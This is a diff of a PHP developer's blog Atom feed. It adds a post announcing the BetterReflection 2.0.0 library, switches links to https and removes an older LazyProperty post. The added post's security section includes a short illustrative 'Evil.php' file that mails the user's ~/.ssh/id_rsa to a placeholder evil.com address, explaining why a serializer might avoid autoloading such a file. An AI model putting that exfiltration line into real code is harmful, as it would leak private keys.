@@ -3,9 +3,278 @@
     <title><![CDATA[]]></title>
     <link href="https://ocramius.github.io/atom.xml" rel="self"/>
     <link href="https://ocramius.github.io/"/>
-    <updated>2017-05-30T14:36:08+02:00</updated>
+    <updated>2017-09-18T23:12:03+02:00</updated>
     <id>https://ocramius.github.io/</id>
         <generator uri="http://sculpin.io/">Sculpin</generator>
+            <entry>
+            <title type="html"><![CDATA[BetterReflection version 2.0.0 released]]></title>
+            <link href="https://ocramius.github.io/blog/roave-better-reflection-v2.0"/>
+            <updated>2017-09-18T00:00:00+02:00</updated>
+            <id>https://ocramius.github.io/blog/roave-better-reflection-v2.0</id>
+            <content type="html"><![CDATA[<p>
+    <a href="https://twitter.com/RoaveTeam" target="_blank" rel="fn org">Roave</a>'s
+    <a href="https://github.com/Roave/BetterReflection" target="_blank">BetterReflection</a>
+    <a href="https://github.com/Roave/BetterReflection/releases/tag/2.0.0" target="_blank">2.0.0s</a>
+    was released today!
+</p>
+
+<p>
+    I and <a href="http://twitter.com/asgrim" target="_blank">James Titcumb</a> started working on this
+    project back in 2015, and it is a pleasure to see it reaching maturity.
+</p>
+
+<p>
+    The initial idea was simple: James would implement all my wicked ideas, while I
+    would lay back and get drunk on Drambuie.
+</p>
+
+<p>
+    <img
+        src="../../img/posts/2017-09-18-roave-better-reflection-v2.0.0/drunken-coding.jpg"
+        alt="Me, drunk in bed. Photo by @Asgrim, since I was too drunk to human"
+    />
+</p>
+
+<p>
+    Yes, that actually happened. Thank you, James, for all the hard work! 🍻
+</p>
+
+<p>
+    <small>(I did some work too, by the way!)</small>
+</p>
+
+<h3>What the heck is BetterReflection?</h3>
+
+<p>
+    Jokes apart, the project is quite ambitious, and it aims at reproducing the entirety of the PHP
+    reflection API without having any actual autoloading being triggered.
+</p>
+
+<p>
+    When put in use, it looks like this:
+</p>
+
+<pre><code class="php">&lt;?php
+
+// src/MyClass.php
+
+namespace MyProject;
+
+class MyClass
+{
+    public function something() {}
+}
+</code></pre>
+
+<pre><code class="php">&lt;?php
+
+// example1.php
+
+use MyProject\MyClass;
+use Roave\BetterReflection\BetterReflection;
+use Roave\BetterReflection\Reflection\ReflectionMethod;
+
+require_once __DIR__ . '/vendor/autoload.php';
+
+$myClass = (new BetterReflection())
+    -&gt;classReflector()
+    -&gt;reflect(MyClass::class);
+
+$methodNames = \array_map(function (ReflectionMethod $method) : string {
+    return $method-&gt;getName();
+}, $myClass-&gt;getMethods());
+
+\var_dump($methodNames);
+
+// class was not loaded:
+\var_dump(\sprintf('Class %s loaded: ', MyClass::class));
+\var_dump(\class_exists(MyClass::class, false));
+</code></pre>
+
+<p>
+    As you can see, the difference is just in how you bootstrap the reflection API.
+</p>
+
+<p>
+    Also, we do provide a fully backwards-compatible reflection API that you can use
+    if your code heavily relies on <code>ext-reflection</code>:
+</p>
+
+<pre><code class="php">&lt;?php
+
+// example2.php
+
+use MyProject\MyClass;
+use Roave\BetterReflection\BetterReflection;
+use Roave\BetterReflection\Reflection\Adapter\ReflectionClass;
+
+require_once __DIR__ . '/vendor/autoload.php';
+
+$myClass = (new BetterReflection())
+    -&gt;classReflector()
+    -&gt;reflect(MyClass::class);
+
+$reflectionClass = new ReflectionClass($myClass);
+
+// You can just use it wherever you had `ReflectionClass`!
+\var_dump($reflectionClass instanceof \ReflectionClass);
+\var_dump($reflectionClass-&gt;getName());
+</code></pre>
+
+<p>
+    How does that work?
+</p>
+
+<p>
+    The operational concept is quite simple, really:
+</p>
+
+<ol>
+    <li>
+        We scan your codebase for files matching the one containing your class.
+        This is fully configurable, but by default we use some ugly autoloader
+        hacks to find the file without wasting disk I/O.
+    </li>
+    <li>
+        We feed your PHP file to <a href="https://github.com/nikic/PHP-Parserr" target="_blank">PHP-Parser</a>
+    </li>
+    <li>
+        We analyse the produced <abbr title="Abstract Syntax Tree">AST</abbr> and
+        wrap it in a matching <code>Roave\BetterReflection\Reflection\*</code>
+        class instance, ready for you to consume it.
+    </li>
+</ol>
+
+<p>
+    The hard part is tracking the miriad of details of the PHP language,
+    which is very complex and cluttered with scope, visibility and inheritance
+    rules: we take care of it for you.
+</p>
+
+<h3>Use case scenarios</h3>
+
+<p>
+    The main use-cases for BetterReflection are most likely around security, code
+    analysis and <abbr title="Ahead of Time">AOT</abbr> compilation.
+</p>
+
+<p>
+    One of the most immediate use-cases will likely be in
+    <a href="https://github.com/phpstan/phpstan" target="_blank">PHPStan</a>, which
+    will finally be able to inspect hideous mixed OOP/functional/procedural code
+    if <a href="https://github.com/phpstan/phpstan/issues/67" target="_blank">
+        the current WIP implementation
+    </a> works as expected.
+</p>
+
+<p>
+    Since you can now "work" with code before having loaded it, you can harden API
+    around a lot of security-sensitive contexts. A serializer may decide
+    to not load a class if side-effects are contained in the file declaring it:
+</p>
+
+<pre><code class="php">&lt;?php
+
+// Evil.php
+\mail(
+    'haxxor@evil.com',
+    'All ur SSH keys are belong to us',
+    \file_get_contents('~/.ssh/id_rsa')
+);
+
+// you really don't want to autoload this bad one:
+class Evil {}
+</code></pre>
+
+<p>
+    The same goes for classes implementing malicious <code>__destruct</code> code,
+    as well as classes that may trigger autoloading of other malicious code.
+</p>
+
+<p>
+    It is also possible to analyse code that is downloaded from the internet without
+    actually running it. For instance, code may be checked against GPG signatures in
+    the file signature before being run, effectively allowing PHP to "run only signed code".
+    <a href="https://getcomposer.org/" target="_blank">Composer</a>, anybody?
+</p>
+
+<p>
+    If you are more into code analysis, you may decide to compare two different
+    versions of a library, and scan for <abbr title="Backwards Compatibility">BC</abbr>
+    breaks:
+</p>
+
+<pre><code class="php">&lt;?php
+// the-library/v1/src/SomeApi.php
+
+class SomeAPI
+{
+    public function sillyThings() { /* ... */ }
+}
+</code></pre>
+
+<pre><code class="php">&lt;?php
+// the-library/v2/src/SomeApi.php
+
+class SomeAPI
+{
+    public function sillyThings(UhOh $bcBreak) { /* ... */ }
+}
+</code></pre>
+
+<p>
+    In this scenario, somebody added a mandatory parameter to <code>SomeAPI#sillyThings()</code>,
+    effectively introducing a BC break that is hard to detect without having both versions of the
+    code available, or a good migration documentation (library developers: please document this
+    kind of change!).
+</p>
+
+<p>
+    Another way to leverage the power of this factory is to compile factory code into highly 
+    optimised dependency injection containers, like
+    <a href="https://github.com/PHP-DI/PHP-DI/pull/507" target="_blank">PHP-DI</a> started doing.
+</p>
+
+<h3>Future use cases?</h3>
+
+<p>
+    In addition to the above use-case scenarios, we are working on additional
+    functionality that would allow
+    <a href="https://github.com/Roave/BetterReflection/blob/2.0.0/demo/monkey-patching/index.php" target="_blank">
+        changing code before loading it
+    </a>. 
+</p>
+
+<p>
+    Is that a good idea?
+</p>
+
+<p>
+    ... I honestly don't know.
+</p>
+
+<p>
+    Still, there are proper use-case scenarios around
+    <abbr title="Aspect Oriented Programming">AOP</abbr> and proxying libraries,
+    which would then be able to work even with <code>final</code> classes.
+</p>
+
+<p>
+    You will likely see these features appear in a new, separate library.
+</p>
+
+<h3>Credits</h3>
+
+<p>
+    To conclude, I would like to thank <a href="https://github.com/asgrim" target="_blank">James Titcumb</a>, 
+    <a href="https://github.com/kukulich" target="_blank">Jaroslav Hanslík</a>,
+    <a href="https://github.com/marcosh" target="_blank">Marco Perone</a> and
+    <a href="https://github.com/POPSuL" target="_blank">Viktor Suprun</a> for the effort they put in this release,
+    providing patches, improvements and overall helping us building something that may become
+    extremely useful in the PHP ecosystem.
+</p>
+]]></content>
+        </entry>
             <entry>
             <title type="html"><![CDATA[Eliminating Visual Debt]]></title>
             <link href="https://ocramius.github.io/blog/eliminating-visual-debt"/>
@@ -1339,7 +1608,7 @@ ssh-rsa AAAAB3NzaC ... pdqtlwX6m1 cardno:000123457915
 </p>
 
 <p>
-    <a href="http://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
+    <a href="https://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
     <a href="https://github.com/Ocramius/ProxyManager/releases/tag/2.0.0" target="_blank">2.0.0</a>
     was finally released today!
 </p>
@@ -2092,7 +2361,7 @@ class PatchedBot extends BotThatDoesSpecialThings { /* ... */ }
 <p>
     There will be less stuffing functionality in existing code via inheritance, which, in my
     opinion, is a symptom of haste combined with 
-    <a href="http://en.wikipedia.org/wiki/Feature_creep" target="_blank">feature creep</a>.
+    <a href="https://en.wikipedia.org/wiki/Feature_creep" target="_blank">feature creep</a>.
 </p>
 
 <p>
@@ -2347,7 +2616,7 @@ class SwitchableDbRegistrationService extends RegistrationService
 <p>
     Today I finally released version 
     <a href="https://github.com/Ocramius/ProxyManager/releases/tag/1.0.0" target="_blank">1.0.0</a> of the 
-    <a href="http://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
+    <a href="https://ocramius.github.io/ProxyManager" target="_blank">ProxyManager</a>
 </p>
 
 <h3>Noticeable improvements since 0.5.2:</h3>
@@ -2590,7 +2859,7 @@ curl -sS https://getcomposer.org/installer | php --
     Last year, I
     <a href="https://github.com/zendframework/zf2/pull/4145" target="_blank">worked on a feature</a>
     for ZF2 called
-    <a href="http://framework.zend.com/manual/2.3/en/modules/zend.service-manager.delegator-factories.html" target="_blank">
+    <a href="https://framework.zend.com/manual/2.3/en/modules/zend.service-manager.delegator-factories.html" target="_blank">
         "Delegator Service Factories"
     </a>, which was included in Zend Framework 2.2.0.
 </p>
@@ -2862,13 +3131,13 @@ return [
 
 <p>
     I initially designed these factories to solve a different problem, which is
-    <a href="http://framework.zend.com/manual/2.3/en/modules/zend.service-manager.lazy-services.html" target="_blank">Lazy Services</a>.
+    <a href="https://framework.zend.com/manual/2.3/en/modules/zend.service-manager.lazy-services.html" target="_blank">Lazy Services</a>.
 </p>
 
 <p>
     In the context of lazy services and decorators, the instance returned by these factories
     is indeed a
-    "<a href="http://en.wikipedia.org/wiki/Delegation_pattern" target="_blank">delegate</a>",
+    "<a href="https://en.wikipedia.org/wiki/Delegation_pattern" target="_blank">delegate</a>",
     therefore I came up with the name "delegator factory".
 </p>
 
@@ -2894,306 +3163,12 @@ return [
 
 <p>
     The entire functionality was introduced by accident while I was working on an implementation of
-    <a href="http://ocramius.github.io/blog/zf2-and-symfony-service-proxies-with-doctrine-proxies/" target="_blank">Lazy Services</a>,
+    <a href="https://ocramius.github.io/blog/zf2-and-symfony-service-proxies-with-doctrine-proxies/" target="_blank">Lazy Services</a>,
     and they surely need a rename. This will not happen in Zend Framework 2.x.
 </p>
 
 <p>
     I hope this helps you with your day-to-day hacking around your ZF2 apps!
-</p>
-]]></content>
-        </entry>
-            <entry>
-            <title type="html"><![CDATA[LazyProperty - Automatic property initialization for PHP]]></title>
-            <link href="https://ocramius.github.io/blog/lazy-property-automatic-property-initialization"/>
-            <updated>2014-02-19T00:00:00+01:00</updated>
-            <id>https://ocramius.github.io/blog/lazy-property-automatic-property-initialization</id>
-            <content type="html"><![CDATA[<p>
-    Yesterday, I worked on yet another interesting little experiment, which is called
-    <a href="https://github.com/Ocramius/LazyProperty" target="_blank">
-        LazyProperty
-    </a>.
-</p>
-
-<h2>The problem with "lazy" properties</h2>
-
-<p>
-    The idea is very simple: avoid manually checking object properties to see if they were initialized.
-</p>
-
-<p>
-    Let's make a simple example:
-</p>
-
-<pre><code class="php">&lt;?php
-
-class UserService
-{
-    // ...
-    protected $userRepository;
-
-    public function register($user)
-    {
-        // ...
-        $this-&gt;getUserRepository()-&gt;add($user);
-    }
-
-    // ...
-
-    protected function getUserRepository()
-    {
-        // we're not using DI here because of performance implications
-        // developers often use a service locator for RAD here
-        return $this-&gt;userRepository
-            ?: $this-&gt;userRepository = new MemoryUserRepository();
-    }
-}
-</code></pre>
-
-<hr/>
-
-<p>
-    This is a fairly simple approach, and it is perfectly fine to use it when we don't want to be forced
-    to build the <code>MemoryUserRepository</code> instance for calls to API methods that don't use
-    it.
-</p>
-
-<p>
-    There is a problem though, which is that any direct access to <code>UserService#$userRepository</code>
-    has to be avoided: all of the class' implementation as well as its subclasses have to rely on the
-    protected getter in order to access the repository instance.
-</p>
-
-<p>
-    For instance, the following code works only because of a lucky combination of events:
-</p>
-
-<pre><code class="php">&lt;?php
-
-class UserService
-{
-    // ...
-    protected $userValidator;
-
-    public function register($user)
-    {
-        $this-&gt;getUserRepository()-&gt;add($user);
-    }
-
-    public function login($userId)
-    {
-        // mind this - this is a mistake!
-        $this-&gt;userRepository-&gt;find($userId);
-        // ...
-    }
-}
-</code></pre>
-
-<pre><code class="php">&lt;?php
-
-$user = build_user_somehow();
-
-$userService-&gt;register($user);
-$userService-&gt;login($user-&gt;getId());
-</code></pre>
-
-<p>
-    This code will run, but only because <code>UserService#register()</code> was called before
-    <code>UserService#login()</code>.
-</p>
-
-<hr/>
-
-<h2>Possible solutions</h2>
-
-<p>
-    The code in the examples exposes a silly bug, and it should be fixed by avoiding any property
-    access to <code>UserService#$userRepository</code>.
-</p>
-
-<p>
-    Moreover, implementors of subclasses will also experience the issue if they try accessing the
-    un-initialized property. The fix for that is to just define
-    <code>UserService#$userRepository</code> as <code>private</code> and being very defensive
-    about its usage.
-</p>
-
-<p>
-    These are all valid solutions, but we still don't get around using a protected getter in our
-    class' scope, which I personally consider ugly.
-</p>
-
-<p>
-    That's where I had this possibly crazy idea: making the property itself "lazy" and avoiding the
-    getter call completely, making the getter an implementation detail.
-</p>
-
-<p>
-    Let's see how this is done with the library:
-</p>
-
-<pre><code class="php">&lt;?php
-
-class UserService
-{
-    use \LazyProperty\LazyPropertiesTrait;
-
-    protected $userRepository;
-
-    public function __construct()
-    {
-        // ...
-        // mind this - we are marking "userRepository" as lazy
-        $this-&gt;initLazyProperties(['userRepository']);
-    }
-
-    public function register($user)
-    {
-        // ...
-        // now use the property directly
-        $this-&gt;userRepository-&gt;add($user);
-        // ...
-    }
-
-    public function login($userId)
-    {
-        $this-&gt;userRepository-&gt;find($userId);
-        // ...
-    }
-
-    protected function getUserRepository()
-    {
-        return $this-&gt;userRepository
-            ?: $this-&gt;userRepository = new MemoryUserRepository();
-    }
-}
-</code></pre>
-
-<p>
-    By calling <code>LazyProperty\LazyPropertiesTrait#initLazyProperties()</code>, we've made sure
-    that any access to the un-initialized <code>UserService#$userRepository</code> will actually
-    trigger a call to <code>UserService#getUserRepository()</code>, and therefore initialize it.
-</p>
-
-<p>
-    With that, we don't need to actually worry about calling the getter: both the getter call and
-    property access will work the same way, which is pretty cool!
-</p>
-
-<hr/>
-
-<h2>Under the hood</h2>
-
-<p>
-    What is going on? I'm simply exploiting an feature of the PHP language on which I've already
-    blogged at <a href="http://ocramius.github.io/blog/intercepting-public-property-access-in-php/" target="_blank">
-        Property Accessors in PHP Userland
-    </a>.
-</p>
-
-<p>
-    As a reference, here is the annotated body of <a href="https://github.com/Ocramius/LazyProperty/blob/fe60bd66455b6acf34fe0be25a83a625db6b2f88/src/LazyProperty/LazyPropertiesTrait.php#L37-L58" target="_blank">
-        <code>LazyProperty\LazyPropertiesTrait#initLazyProperties()</code>
-    </a>:
-</p>
-
-<pre><code class="php">&lt;?php
-
-private function initLazyProperties(array $lazyPropertyNames, $checkLazyGetters = true)
-{
-    foreach ($lazyPropertyNames as $lazyProperty) {
-
-        // verify that a getter is available for the given lazy property
-        if ($checkLazyGetters &amp;&amp; ! method_exists($this, 'get' . $lazyProperty)) {
-            throw MissingLazyPropertyGetterException::fromGetter($this, 'get' . $lazyProperty, $lazyProperty);
-        }
-
-        // record the properties that were defined as "lazy"
-        $this-&gt;lazyPropertyAccessors[$lazyProperty] = false;
-
-        // if the property is defined, then ignore it (we don't want to sensibly alter object state)
-        if (! isset($this-&gt;$lazyProperty)) {
-            // unset the property, this allows us to use magic getters
-            unset($this-&gt;$lazyProperty);
-        }
-    }
-}
-</code></pre>
-
-<p>
-    Quite simple! Nothing really incredible going on here. When is the property actually initialized?
-</p>
-
-<p>
-    The other method defined by the trait is the <a href="https://github.com/Ocramius/LazyProperty/blob/fe60bd66455b6acf34fe0be25a83a625db6b2f88/src/LazyProperty/LazyPropertiesTrait.php#L60-L84" target="_blank">
-        Magic getter <code>LazyProperty\LazyPropertiesTrait#__get()</code>
-    </a>:
-</p>
-
-<pre><code class="php">&lt;?php
-
-// returning a reference is required,
-// otherwise (for example) array properties accessed for writes will fail
-public function &amp; __get($name)
-{
-    // disallow access to non-existing properties
-    if (! isset($this-&gt;lazyPropertyAccessors[$name])) {
-        throw InvalidLazyProperty::nonExistingLazyProperty($this, $name);
-    }
-
-    // retrieve the object that is trying to access the lazy property
-    $caller = debug_backtrace(DEBUG_BACKTRACE_PROVIDE_OBJECT)[1];
-
-    // disallow access from invalid scope
-    // basically reproduces property visibility in userland
-    if (! isset($caller['object']) || $caller['object'] !== $this) {
-        AccessScopeChecker::checkCallerScope($caller, $this, $name);
-    }
-
-    // set the property to `null` (disables notices)
-    $this-&gt;$name = null;
-
-    // initialize the property
-    $this-&gt;$name = $this-&gt;{'get' . $name}();
-
-    return $this-&gt;$name;
-}
-</code></pre>
-
-<hr/>
-
-<h2>Conclusions</h2>
-
-<p>
-    This "hack" is simple, clean, easily tested and doesn't cause any problems.
-    It works on PHP 5.4, 5.5, 5.6 and even on HHVM, which I wasn't expecting.
-</p>
-
-<p>
-    Can you use it? Yes, why not? Do you need it? Usually not. Being defensive about usage of your
-    APIs can actually avoid sloppy mistakes like the ones that I've described in the examples.
-</p>
-
-<p>
-    Correctly annotating your properties with <code>/** @var Type|null */</code> also helps tools
-    like <a href="https://github.com/scrutinizer-ci/php-analyzer" target="_blank">PHP Analyzer</a>
-    in discovering such bugs via static analysis.
-</p>
-
-<p>
-    Clean dependency injection and eventually proxying dependencies also produces better and easier
-    testable results than explicit lazy-loading coded in your classes.
-</p>
-
-<p>
-    The most interesting result in this experiment is that PHP yet again allows to implement
-    language-level features in userland, which is awesome!
-</p>
-
-<p>
-    Please let me know if you like this project by giving it a
-    <a href="https://github.com/Ocramius/LazyProperty" target="_blank">star</a>, or just drop me a tweet if
-    you think it can be enhanced!
 </p>
 ]]></content>
         </entry>
